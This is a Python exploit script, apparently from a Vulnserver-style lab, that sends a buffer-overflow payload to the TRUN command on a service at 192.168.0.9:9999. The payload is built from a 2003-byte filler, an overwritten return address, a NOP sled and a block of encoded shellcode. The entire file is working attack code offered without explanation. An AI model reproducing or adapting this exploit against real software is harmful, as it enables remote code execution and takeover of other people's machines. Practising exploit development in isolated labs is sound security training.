import socket
import struct
import offset
def exploiting():

    s = socket.socket()
    s.connect(('192.168.0.9',9999))
    eip_new = struct.pack("<I",0x62501203)
    buf =  b""
    buf += b"\xda\xd1\xd9\x74\x24\xf4\xbb\xba\xdc\x34\x80\x58\x33"
    buf += b"\xc9\xb1\x56\x31\x58\x18\x83\xe8\xfc\x03\x58\xae\x3e"
    buf += b"\xc1\x7c\x26\x3c\x2a\x7d\xb6\x21\xa2\x98\x87\x61\xd0"
    buf += b"\xe9\xb7\x51\x92\xbc\x3b\x19\xf6\x54\xc8\x6f\xdf\x5b"
    buf += b"\x79\xc5\x39\x55\x7a\x76\x79\xf4\xf8\x85\xae\xd6\xc1"
    buf += b"\x45\xa3\x17\x06\xbb\x4e\x45\xdf\xb7\xfd\x7a\x54\x8d"
    buf += b"\x3d\xf0\x26\x03\x46\xe5\xfe\x22\x67\xb8\x75\x7d\xa7"
    buf += b"\x3a\x5a\xf5\xee\x24\xbf\x30\xb8\xdf\x0b\xce\x3b\x36"
    buf += b"\x42\x2f\x97\x77\x6b\xc2\xe9\xb0\x4b\x3d\x9c\xc8\xa8"
    buf += b"\xc0\xa7\x0e\xd3\x1e\x2d\x95\x73\xd4\x95\x71\x82\x39"
    buf += b"\x43\xf1\x88\xf6\x07\x5d\x8c\x09\xcb\xd5\xa8\x82\xea"
    buf += b"\x39\x39\xd0\xc8\x9d\x62\x82\x71\x87\xce\x65\x8d\xd7"
    buf += b"\xb1\xda\x2b\x93\x5f\x0e\x46\xfe\x37\xe3\x6b\x01\xc7"
    buf += b"\x6b\xfb\x72\xf5\x34\x57\x1d\xb5\xbd\x71\xda\xcc\xaa"
    buf += b"\x81\x34\x76\xba\x7f\xb5\x86\x92\xbb\xe1\xd6\x8c\x6a"
    buf += b"\x8a\xbd\x4c\x92\x5f\x2b\x47\x04\xa0\x03\x0b\x74\x48"
    buf += b"\x51\xb4\x65\xd5\xdc\x52\xd5\xb5\x8e\xca\x96\x65\x6e"
    buf += b"\xbb\x7e\x6c\x61\xe4\x9f\x8f\xa8\x8d\x0a\x60\x04\xe5"
    buf += b"\xa2\x19\x0d\x7d\x52\xe5\x98\xfb\x54\x6d\x28\xfb\x1b"
    buf += b"\x86\x59\xef\x4c\xf1\xa1\xef\x8c\x94\xa1\x85\x88\x3e"
    buf += b"\xf6\x31\x93\x67\x30\x9e\x6c\x42\x43\xd9\x93\x13\x75"
    buf += b"\x91\xa2\x81\x39\xcd\xca\x45\xb9\x0d\x9d\x0f\xb9\x65"
    buf += b"\x79\x74\xea\x90\x86\xa1\x9f\x08\x13\x4a\xc9\xfd\xb4"
    buf += b"\x22\xf7\xd8\xf3\xec\x08\x0f\x80\xeb\xf6\xcd\xaf\x53"
    buf += b"\x9e\x2d\xf0\x63\x5e\x44\xf0\x33\x36\x93\xdf\xbc\xf6"
    buf += b"\x5c\xca\x94\x9e\xd7\x9b\x57\x3f\xe7\xb1\x36\xe1\xe8"
    buf += b"\x36\xe3\x12\x92\x37\x14\xd3\x63\x5e\x71\xd4\x63\x5e"
    buf += b"\x87\xe9\xb5\x67\xfd\x2c\x06\xdc\x0e\x1b\x2b\x75\x85"
    buf += b"\x63\x7f\x85\x8c"
    shellcode = buf
    nopsled = b"\x90"*16
    offset1 = 2003
    payload = [ b"TRUN /.:/",b"A"*2003,eip_new,nopsled,shellcode,b"C"*(2984-len(eip_new)-2003 - len(nopsled)-len(shellcode))]
    payload = b"".join(payload)
    s.send(payload)
    #s.close()
#return "Done"